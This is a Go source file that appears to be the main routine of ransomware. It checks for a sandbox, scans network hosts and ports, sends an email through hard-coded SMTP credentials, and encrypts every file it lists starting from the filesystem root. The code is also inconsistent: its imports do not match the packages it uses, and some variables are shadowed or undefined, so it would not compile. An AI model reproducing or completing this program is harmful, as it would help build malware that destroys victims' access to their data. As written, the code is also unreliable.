package main

import (
	"ran/ant"
	"ran/snail"
	"ran/fl"
	"ran/enc"

	"log"
)


func main() {
	ant.Sandbox()
	err := ant.Before()
	if err != nil {
		log.Println("Processing failed:", err)
	}

    ips, err := ant.Hosts()
    if err != nil {
		log.Println("Scanning failed:", err)
	}
	ports := ant.Ports(ips)

	email := &mail.Email{
		From:       "user@example.org",
		Password:   "example",
		ServerHost: "example.org",
		ServerPort: "587",
		To:         []string{"recepient@example.com"},
		Subject:    "Test Email",
		Body:       "Bazinga.",
	}
	err = email.Send()
	if err != nil {
		log.Println("Cannot send mail:", err)
	}

	key := encrypt.GenerateKey()

	fl := fl.Files("/")
	for _, fl := range files {
		encrypt.Encrypt(key, file)
	}

	err = ant.After()
	if err != nil {
		log.Println("ending failed:", err)
	}
}
